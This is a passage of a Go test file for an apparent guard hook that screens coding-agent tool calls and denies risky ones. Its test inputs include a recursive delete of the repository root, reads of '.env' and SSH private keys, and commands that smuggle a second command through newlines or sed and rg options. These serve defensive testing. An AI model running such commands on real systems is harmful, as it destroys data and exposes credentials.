			t.Setenv("TRELLIS_DISABLE_HOOKS", "0")

			var stdout bytes.Buffer
			var stderr bytes.Buffer
			code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
			if code != 0 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) ||
				!strings.Contains(stdout.String(), "hook control invalid") {
				t.Fatalf("invalid control must fail closed, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
			}
		})
	}
}

func TestRunGuardHookSendsWorkspaceRootAndGuardsSensitiveReads(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	workingDirectory := filepath.Join(repo, "nested")
	if err := os.MkdirAll(workingDirectory, 0o700); err != nil {
		t.Fatalf("create working directory: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, workingDirectory, "Read", map[string]any{"file_path": "../.env"})

	var captured hookAgentGuardRequest
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := json.NewDecoder(r.Body).Decode(&captured); err != nil {
			t.Fatalf("decode request: %v", err)
		}
		writeHookDecisionResponse(t, w, map[string]any{"decision": "deny", "reason": "sensitive read"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
		t.Fatalf("sensitive read must reach backend and deny, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	if captured.WorkspaceRoot != repo {
		t.Fatalf("hook request must include repository workspace root, got %q want %q", captured.WorkspaceRoot, repo)
	}
	if captured.WorkingDirectory != workingDirectory {
		t.Fatalf("hook request must include actual working directory, got %q want %q", captured.WorkingDirectory, workingDirectory)
	}
	if captured.GuardDecision != "deny" || captured.GuardRiskLevel != "high" {
		t.Fatalf("hook request must include Guard Core floor, got %+v", captured)
	}
}

func TestRunGuardHookLocalDenyCannotBeDowngradedByBackend(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{"command": "Remove-Item -Recurse ."})

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "stale backend allow"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
		t.Fatalf("Guard Core deny must remain deny, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
}

func TestRunGuardHookIgnoresNestedWorkspaceRootOverride(t *testing.T) {
	liveRepo := t.TempDir()
	offRepo := t.TempDir()
	for _, repo := range []string{liveRepo, offRepo} {
		if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
			t.Fatalf("create git marker: %v", err)
		}
	}
	if err := writeProjectHookControl(liveRepo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	if err := writeProjectHookControl(offRepo, projectHookModeOff); err != nil {
		t.Fatalf("write off control: %v", err)
	}

	inputPath := writeHookPayloadForRepo(t, liveRepo, "shell", map[string]any{
		"command":       "Remove-Item -Recurse .",
		"cwd":           offRepo,
		"workspaceRoot": offRepo,
	})
	requests := 0
	var captured hookAgentGuardRequest
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests++
		if err := json.NewDecoder(r.Body).Decode(&captured); err != nil {
			t.Fatalf("decode request: %v", err)
		}
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "stale backend allow"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || requests != 1 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
		t.Fatalf("nested workspace override must not disable live governance, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}
	if captured.WorkspaceRoot != liveRepo || captured.WorkingDirectory != liveRepo {
		t.Fatalf("hook request must remain bound to the live repository, got %+v", captured)
	}
}

func TestExplicitLowRiskOfflineHookRejectsWritesAndUnsafeReadOptions(t *testing.T) {
	t.Parallel()

	eligible := func(action guard.ActionInput) bool {
		if action.CWD == "" {
			action.CWD = `X:\demo\project`
		}
		if action.ProjectRoot == "" {
			action.ProjectRoot = `X:\demo\project`
		}
		return isExplicitLowRiskOfflineHook(action, guard.Evaluate(action))
	}

	for _, action := range []guard.ActionInput{
		{ToolName: "Write", ActionType: "write", Target: "notes.md"},
		{ToolName: "shell", ActionType: "command", Command: "git diff --output=.ssh/id_rsa"},
		{ToolName: "shell", ActionType: "command", Command: `rg --pre "powershell -Command Get-Content" .`},
		{ToolName: "shell", ActionType: "command", Command: "git status\nSet-Content report.md changed"},
		{ToolName: "shell", ActionType: "command", Command: "git status\r\nSet-Content report.md changed"},
		{ToolName: "PowerShell", ActionType: "command", Command: `git status \; Set-Content report.md changed`},
		{ToolName: "shell", ActionType: "command", Command: `sed -i 's/a/b/' README.md`},
		{ToolName: "shell", ActionType: "command", Command: `sed -n '1w report.txt' README.md`},
		{ToolName: "shell", ActionType: "command", Command: `sed -n '1e touch owned' README.md`},
		{ToolName: "shell", ActionType: "command", Command: `sed -n 1\,40p README.md`},
	} {
		if eligible(action) {
			t.Fatalf("offline fallback must reject %+v", action)
		}
	}

	for _, command := range []string{
		"git diff --stat",
		`rg "foo|bar" .`,
		`rg "powershell|curl" docs`,
		`sed -n '1,40p' README.md`,
		`sed -n '1,40P' README.md`,
		"ls",
		"ls scripts/powershell",
		"dir .",
		"Get-ChildItem",
	} {
		action := guard.ActionInput{ToolName: "shell", ActionType: "command", Command: command}
		if !eligible(action) {
			t.Fatalf("read-only command must remain eligible after Guard Core evaluation: %s", command)
		}
	}
}

func TestFindCLIRepoRootSupportsInitializedNonGitProject(t *testing.T) {
	repo := t.TempDir()
	nested := filepath.Join(repo, "src", "feature")
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create project marker: %v", err)
	}
	if err := os.MkdirAll(nested, 0o700); err != nil {
		t.Fatalf("create nested directory: %v", err)
	}

	root, err := findCLIRepoRoot(nested)
	if err != nil {
		t.Fatalf("find initialized project root: %v", err)
	}
	if root != repo {
		t.Fatalf("unexpected project root %q want %q", root, repo)
	}
}

func TestFindCLIRepoRootPrefersOuterControlledProjectOverInnerMarker(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create outer git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write outer hook control: %v", err)
	}
	inner := filepath.Join(repo, "packages", "demo")
	if err := os.MkdirAll(filepath.Join(inner, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create inner project marker: %v", err)
	}
	nested := filepath.Join(inner, "src")
	if err := os.MkdirAll(nested, 0o700); err != nil {
		t.Fatalf("create nested directory: %v", err)
	}

	root, err := findCLIRepoRoot(nested)
	if err != nil {
		t.Fatalf("find controlled project root: %v", err)
	}
	if root != repo {
		t.Fatalf("empty inner marker must not shadow outer controlled project, got %q want %q", root, repo)
	}
}

func TestFindCLIRepoRootPrefersNearestExplicitControl(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create outer git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write outer hook control: %v", err)
	}
	inner := filepath.Join(repo, "packages", "demo")
	if err := os.MkdirAll(filepath.Join(inner, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create inner project marker: %v", err)
	}
	if err := writeProjectHookControl(inner, projectHookModeOff); err != nil {
		t.Fatalf("write inner hook control: %v", err)
	}

	root, err := findCLIRepoRoot(filepath.Join(inner, "src"))
	if err != nil {
		t.Fatalf("find nested controlled project root: %v", err)
	}
	if root != inner {
		t.Fatalf("nearest explicit control must define the nested project, got %q want %q", root, inner)
	}
}

func TestSameHookPathUsesPlatformCaseRules(t *testing.T) {
	if !sameHookPathForOS(`C:\Repo\AgentToolGate`, `c:\repo\agenttoolgate`, "windows") {
		t.Fatal("Windows hook paths must remain case-insensitive")
	}
	if sameHookPathForOS("/tmp/Repo/AgentToolGate", "/tmp/repo/agenttoolgate", "linux") {
		t.Fatal("Linux hook paths must preserve case")
	}
}

func TestHookFastPathReadRejectsWorkspaceEscape(t *testing.T) {
	repo := t.TempDir()
	outside := filepath.Join(filepath.Dir(repo), "outside.txt")
	if err := os.WriteFile(outside, []byte("outside"), 0o600); err != nil {
		t.Fatalf("write outside target: %v", err)
	}
	t.Cleanup(func() { _ = os.Remove(outside) })

	action := guard.ActionInput{
		ToolName:    "Read",
		ActionType:  "read",
		Target:      outside,
		CWD:         repo,
		ProjectRoot: repo,
	}
	if isHookFastPathRepoRead(action, repo, guard.Evaluate(action)) {
		t.Fatal("workspace-external read must not use the local fast path")
	}
}

func TestHookFastPathRequiresExplicitLocalReadTool(t *testing.T) {
	repo := t.TempDir()
	for _, name := range []string{"README.md", "WebSearch", "mcp__github__merge_pull_request"} {
		if err := os.WriteFile(filepath.Join(repo, name), []byte("fixture"), 0o600); err != nil {
			t.Fatalf("write fast-path fixture %s: %v", name, err)
		}
	}

	localRead := guard.ActionInput{
		ToolName:    "Read",
		ActionType:  "read",
		Target:      "README.md",
		CWD:         repo,
		ProjectRoot: repo,
	}
	if !isHookFastPathRepoRead(localRead, repo, guard.Evaluate(localRead)) {
		t.Fatal("explicit local Read must use the repository fast path")
	}

	for _, action := range []guard.ActionInput{
		{ToolName: "WebSearch", ActionType: "read", Target: "WebSearch", CWD: repo, ProjectRoot: repo},
		{ToolName: "mcp__github__merge_pull_request", ActionType: "read", Target: "mcp__github__merge_pull_request", CWD: repo, ProjectRoot: repo},
		{ToolName: "Read", ActionType: "write", Target: "README.md", CWD: repo, ProjectRoot: repo},
	} {
		if isHookFastPathRepoRead(action, repo, guard.Evaluate(action)) {
			t.Fatalf("non-local-read action must not use repository fast path: %+v", action)
		}
	}
}

func TestRunGuardHookSkipsAgentToolGateMCPAndGuardsExternalMCP(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}

	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests++
		writeHookDecisionResponse(t, w, map[string]any{"decision": "deny", "reason": "external MCP requires governance"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	internalInput := writeHookPayloadForRepo(t, repo, "mcp__agenttoolgate__mock_echo", map[string]any{"message": "hello"})
	code := run([]string{"guard", "hook", "codex", "--input", internalInput}, &stdout, &stderr)
	if code != 0 || stdout.Len() != 0 || requests != 0 {
		t.Fatalf("AgentToolGate MCP must bypass duplicate hook governance, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}

	stdout.Reset()
	stderr.Reset()
	externalInput := writeHookPayloadForRepo(t, repo, "mcp__github__merge_pull_request", map[string]any{
		"repository_full_name": "example/repo",
		"pr_number":            1,
	})
	code = run([]string{"guard", "hook", "codex", "--input", externalInput}, &stdout, &stderr)
	if code != 0 || requests != 1 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
		t.Fatalf("external MCP must reach hook governance, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}
}

func TestRunGuardHookTrellisHardDisableSkipsBackend(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "Write", map[string]any{"file_path": ".env", "content": "TOKEN=synthetic"})

	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests++
		writeHookDecisionResponse(t, w, map[string]any{"decision": "deny"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)
	t.Setenv("TRELLIS_DISABLE_HOOKS", "1")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "claude", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || stdout.Len() != 0 || requests != 0 {
		t.Fatalf("hard disable must no-op, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}
}

func TestRunGuardHookRejectsBackendErrorsAndReusesTicket(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{"command": "go test ./..."})
	t.Setenv("TRELLIS_HOOKS", "1")
	t.Setenv("TRELLIS_DISABLE_HOOKS", "0")

	t.Run("non-2xx fails closed", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
		}))
		t.Cleanup(server.Close)
		t.Setenv("AGENTTOOLGATE_URL", server.URL)

		var stdout bytes.Buffer
		var stderr bytes.Buffer
		code := run([]string{"guard", "hook", "claude", "--input", inputPath}, &stdout, &stderr)
		if code != 0 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
			t.Fatalf("backend error must deny, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
		}
	})

	t.Run("matching retry carries ticket", func(t *testing.T) {
		var captured []map[string]any
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var payload map[string]any
			if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
				t.Fatalf("decode request: %v", err)
			}
			captured = append(captured, payload)
			if len(captured) == 1 {
				writeHookDecisionResponse(t, w, map[string]any{
					"decision":       "deny_with_ticket",
					"reason":         "approval required",
					"approvalId":     "approval-test-1",
					"approvalStatus": "pending",
					"fingerprint":    "fingerprint-test-1",
				})
				return
			}
			writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "ticket consumed"})
		}))
		t.Cleanup(server.Close)
		t.Setenv("AGENTTOOLGATE_URL", server.URL)

		var stdout bytes.Buffer
		var stderr bytes.Buffer
		code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
		if code != 0 || !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
			t.Fatalf("first request should deny with ticket, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
		}
		stdout.Reset()
		stderr.Reset()
		code = run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
		if code != 0 || stdout.Len() != 0 {
			t.Fatalf("approved retry allow must be Codex no-op, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
		}
		if len(captured) != 2 {
			t.Fatalf("expected two backend calls, got %d", len(captured))
		}
		if _, ok := captured[0]["ticketId"]; ok {
			t.Fatalf("first request must not contain ticket: %+v", captured[0])
		}
		if captured[1]["ticketId"] != "approval-test-1" {
			t.Fatalf("retry must contain matching ticket: %+v", captured[1])
		}
	})
}

func TestRunGuardHookOfflineAllowRequiresPendingAudit(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	blocker := filepath.Join(repo, ".tmp", "local-action-firewall")
	if err := os.MkdirAll(filepath.Dir(blocker), 0o700); err != nil {
		t.Fatalf("create pending audit parent: %v", err)
	}
	if err := os.WriteFile(blocker, []byte("not-a-directory"), 0o600); err != nil {
		t.Fatalf("write pending audit blocker: %v", err)
	}

	inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{"command": "git status"})
	t.Setenv("AGENTTOOLGATE_URL", "http://127.0.0.1:1")
	t.Setenv("AGENTTOOLGATE_HOOK_TIMEOUT_MS", "50")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "claude", "--input", inputPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook returned %d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) ||
		!strings.Contains(stdout.String(), "pending audit unavailable") {
		t.Fatalf("pending audit failure must deny, stdout=%s stderr=%s", stdout.String(), stderr.String())
	}
}

func TestHookHTTPTimeoutDefaultsToOneSecond(t *testing.T) {
	t.Setenv("AGENTTOOLGATE_HOOK_TIMEOUT_MS", "")
	if got := hookHTTPTimeout(); got != time.Second {
		t.Fatalf("unexpected default hook timeout: %s", got)
	}
}

func TestRunGuardHookDeniesWhenTicketPersistenceFails(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{"command": "go test ./..."})

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		blocker := filepath.Join(repo, ".tmp", "agenttoolgate", "hook-tickets")
		if err := os.MkdirAll(filepath.Dir(blocker), 0o700); err != nil {
			t.Fatalf("create ticket parent: %v", err)
		}
		if err := os.WriteFile(blocker, []byte("not-a-directory"), 0o600); err != nil {
			t.Fatalf("write ticket blocker: %v", err)
		}
		writeHookDecisionResponse(t, w, map[string]any{
			"decision":       "deny_with_ticket",
			"reason":         "approval required",
			"approvalId":     "approval-persist-failure",
			"approvalStatus": "pending",
			"fingerprint":    "fingerprint-persist-failure",
		})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "claude", "--input", inputPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook returned %d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) ||
		!strings.Contains(stdout.String(), "hook ticket persistence failed") {
		t.Fatalf("ticket persistence failure must deny, stdout=%s stderr=%s", stdout.String(), stderr.String())
	}
}

func TestRemoveHookTicketOnlyIgnoresMissingFile(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "missing.json")
	if err := removeHookTicket(missing); err != nil {
		t.Fatalf("missing ticket cleanup should succeed: %v", err)
	}

	nonEmptyDir := filepath.Join(t.TempDir(), "ticket.json")
	if err := os.Mkdir(nonEmptyDir, 0o700); err != nil {
		t.Fatalf("create ticket directory: %v", err)
	}
	if err := os.WriteFile(filepath.Join(nonEmptyDir, "child"), []byte("blocked"), 0o600); err != nil {
		t.Fatalf("write ticket child: %v", err)
	}
	if err := removeHookTicket(nonEmptyDir); err == nil {
		t.Fatal("non-missing cleanup failure must be returned")
	}
}

func TestRunGuardHookClaudeSupportsStdin(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	payload, err := json.Marshal(map[string]any{
		"cwd":       repo,
		"tool_name": "Read",
		"tool_input": map[string]any{
			"file_path": ".ssh/id_rsa",
		},
	})
	if err != nil {
		t.Fatalf("marshal payload: %v", err)
	}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "deny", "reason": "sensitive read"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	oldStdin := os.Stdin
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatalf("create stdin pipe: %v", err)
	}
	t.Cleanup(func() {
		os.Stdin = oldStdin
		reader.Close()
	})
	os.Stdin = reader
	if _, err := writer.Write(payload); err != nil {
		t.Fatalf("write stdin payload: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close stdin writer: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "claude", "--input", "-"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook stdin returned %d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), `"permissionDecision":"deny"`) {
		t.Fatalf("expected deny hook output, got %s", stdout.String())
	}
}

func TestRunGuardHookClaudeRejectsInvalidJSONAndUnknowns(t *testing.T) {
	inputPath := filepath.Join(t.TempDir(), "payload.json")
	if err := os.WriteFile(inputPath, []byte(`{"tool_name":`), 0o600); err != nil {
		t.Fatalf("write invalid payload: %v", err)
	}
	cases := []struct {
		name string
		args []string
		want string
	}{
		{name: "invalid json", args: []string{"guard", "hook", "claude", "--input", inputPath}, want: "JSON 无效"},
		{name: "unknown client", args: []string{"guard", "hook", "unknown", "--input", inputPath}, want: "仅支持 claude 或 codex"},
		{name: "unknown mode", args: []string{"guard", "hook", "claude", "--input", inputPath, "--mode", "dry-run"}, want: "--mode enforce"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var stdout bytes.Buffer
			var stderr bytes.Buffer
			code := run(tc.args, &stdout, &stderr)
			if code != 2 {
				t.Fatalf("expected code 2, got %d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
			}
			if !strings.Contains(stderr.String(), tc.want) || stdout.Len() != 0 {
				t.Fatalf("unexpected error, want %q stdout=%s stderr=%s", tc.want, stdout.String(), stderr.String())
			}
		})
	}
}

func TestRunGuardHookCodexPrintsDenyForRootDelete(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{"command": "Remove-Item -Recurse ."})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "deny", "reason": "命中根目录删除"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	var result guard.CodexHookOutput
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode codex hook output: %v output=%s", err, stdout.String())
	}
	specific := result.HookSpecificOutput
	if specific.HookEventName != "PreToolUse" || specific.PermissionDecision != "deny" || !strings.Contains(specific.PermissionDecisionReason, "根目录删除") {
		t.Fatalf("unexpected codex hook output: %+v", result)
	}
	if strings.Contains(stdout.String(), "Remove-Item") {
		t.Fatalf("codex hook output should not include raw command: %s", stdout.String())
	}
}

func TestRunGuardHookCodexAllowBecomesNoop(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	payload, err := json.Marshal(map[string]any{
		"tool_name":    "shell",
		"cwd":          repo,
		"project_root": repo,
		"args":         map[string]any{"command": "git status"},
	})
	if err != nil {
		t.Fatalf("encode hook payload: %v", err)
	}
	t.Setenv("TRELLIS_HOOKS", "1")
	t.Setenv("TRELLIS_DISABLE_HOOKS", "0")
	oldStdin := os.Stdin
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatalf("create stdin pipe: %v", err)
	}
	t.Cleanup(func() {
		os.Stdin = oldStdin
		reader.Close()
	})
	os.Stdin = reader
	if _, err := writer.Write(payload); err != nil {
		t.Fatalf("write stdin payload: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close stdin writer: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", "-"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	if stdout.Len() != 0 {
		t.Fatalf("allow hook output should be no-op, got %s", stdout.String())
	}
}

func TestRunGuardHookCodexCanonicalApplyPatchBecomesNoop(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	patch := "*** Begin Patch\n*** Update File: src/service.go\n*** End Patch\n"
	inputPath := writeHookPayloadForRepo(t, repo, "apply_patch", map[string]any{"command": patch})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var request hookAgentGuardRequest
		if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
			t.Fatalf("decode hook request: %v", err)
		}
		if request.Tool != "apply_patch" || request.ActionType != "write" || request.Target != "src/service.go" || len(request.Targets) != 1 || request.Targets[0] != "src/service.go" {
			t.Fatalf("unexpected canonical apply_patch request: %+v", request)
		}
		if !strings.Contains(request.Content, "*** Update File: src/service.go") {
			t.Fatalf("apply_patch content must reach the governance request, got %q", request.Content)
		}
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "ordinary workspace patch"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr); code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	if stdout.Len() != 0 {
		t.Fatalf("ordinary approved apply_patch must be a Codex no-op, got %s", stdout.String())
	}
}

func TestRunGuardHookCodexProjectProtectionChecksEveryPatchTarget(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create project config directory: %v", err)
	}
	protected := `{
		"version":1,
		"localActionFirewall":{
			"enabled":true,
			"protectedPaths":[{"pattern":"src/core/**","write":"deny","reason":"核心算法目录"}],
			"egress":{"enabled":false}
		}
	}`
	if err := os.WriteFile(projectProtectedPath(repo), []byte(protected), 0o600); err != nil {
		t.Fatalf("write project protection: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	patch := "*** Begin Patch\n*** Update File: src/ui.go\n*** Update File: src/core/algorithm.go\n*** End Patch\n"
	inputPath := writeHookPayloadForRepo(t, repo, "apply_patch", map[string]any{"command": patch})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "stale backend allow"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr); code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	var result guard.CodexHookOutput
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode codex hook output: %v output=%s", err, stdout.String())
	}
	if result.HookSpecificOutput.PermissionDecision != "deny" || !strings.Contains(result.HookSpecificOutput.PermissionDecisionReason, "核心算法目录") {
		t.Fatalf("the second protected patch target must deny, got %+v", result)
	}
}

func TestRunGuardHookCodexProjectProtectionUsesPatchDeleteRule(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
